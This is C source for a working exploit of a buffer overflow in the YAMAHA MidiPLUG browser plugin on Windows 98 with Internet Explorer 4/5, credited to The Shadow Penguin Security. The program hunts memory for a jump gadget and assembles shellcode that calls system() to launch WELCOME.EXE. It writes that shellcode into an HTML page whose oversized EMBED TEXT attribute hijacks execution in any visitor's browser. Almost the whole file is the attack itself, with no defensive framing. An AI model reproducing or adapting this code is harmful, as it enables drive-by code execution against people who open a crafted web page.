/*=============================================================================
   YAMAHA MidiPLUG 1.10b-j for Windows98 IE4.0/5.0 exploit
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/

#include    <stdio.h>
#include    <windows.h>

#define     MAXBUF          700
#define     RETADR          256

unsigned int mems[]={
0xbfe30000,0xbfe43000,0xbfe80000,0xbfe86000,
0xbfe90000,0xbfe96000,0xbfea0000,0xbfeb0000,
0xbfee0000,0xbfee5000,0xbff20000,0xbff47000,
0xbff50000,0xbff61000,0xbff70000,0xbffc6000,
0xbffc9000,0xbffe3000,0,0};

unsigned char exploit_code[200]={
0x90,0xEB,0x50,0x5B,0x53,0x32,0xE4,0x83,0xC3,0x0B,
0x4B,0x90,0x88,0x23,0xB8,0x50,0x57,0xF7,0xBF,0x80,
0xc4,0x20,0xFF,0xD0,0x43,0x90,0xB2,0xE0,0x90,0x28,
0x13,0x28,0x53,0x01,0x28,0x53,0x02,0x28,0x53,0x03,
0x28,0x53,0x04,0x28,0x53,0x05,0x53,0x50,0x32,0xE4,
0x83,0xC3,0x06,0x90,0x88,0x23,0xB8,0x28,0x4E,0xF7,
0xBF,0x80,0xc4,0x20,0xFF,0xD0,0x8B,0xF0,0x43,0x53,
0x90,0x83,0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,0xD6,
0x90,0xEB,0xFD,0xE8,0xAB,0xFF,0xFF,0xFF,0x00
};

unsigned char cmdbuf[200]="MSVCRT.DLL.SYSTEM.WELCOME.EXE";

unsigned int search_mem(FILE *fp,unsigned char *st,unsigned char *ed,
                unsigned char c1,unsigned char c2)
{
    unsigned char   *p;
    unsigned int    adr;

    for (p=st;p<ed;p++)
        if (*p==c1 && *(p+1)==c2){
            adr=(unsigned int)p;
            if ((adr&0xff)==0) continue;
            if (((adr>>8)&0xff)==0) continue;
            if (((adr>>16)&0xff)==0) continue;
            if (((adr>>24)&0xff)==0) continue;
            return(adr);
        }
    return(0);

}
main(int argc,char *argv[])
{
    FILE                    *fp;
    unsigned int            i,ip;
    unsigned char           buf[MAXBUF];

    if (argc<2){
        printf("usage %s output_htmlfile\n",argv[0]);
        exit(1);
    }
    if ((fp=fopen(argv[1],"wb"))==NULL) return FALSE;
    fprintf(fp,"<HTML><EMBED\nTYPE=\"audio/midi\"\nWIDTH=150\nHEIGHT=40\nAUTOSTART=TRUE\nTEXT=\"");
    for (i=0;;i+=2){
        if (mems[i]==0){
            printf("Can not find jmp code.\n");
            exit(1);
        }
        if ((ip=search_mem(fp,(unsigned char *)mems[i],
            (unsigned char *)mems[i+1],0xff,0xe0))!=0) break;
    }
    printf("Jumping address : %x\n",ip);
    memset(buf,0x90,MAXBUF);
    buf[RETADR  ]=ip&0xff;
    buf[RETADR+1]=(ip>>8)&0xff;
    buf[RETADR+2]=(ip>>16)&0xff;
    buf[RETADR+3]=(ip>>24)&0xff;
    strcat(exploit_code,cmdbuf);
    memcpy(buf,exploit_code,strlen(exploit_code));
    buf[MAXBUF]=0;
    fprintf(fp,"%s\"\n>\n</HTML>",buf);
    fclose(fp);
    printf("%s created.\n",argv[1]);
    return FALSE;
}

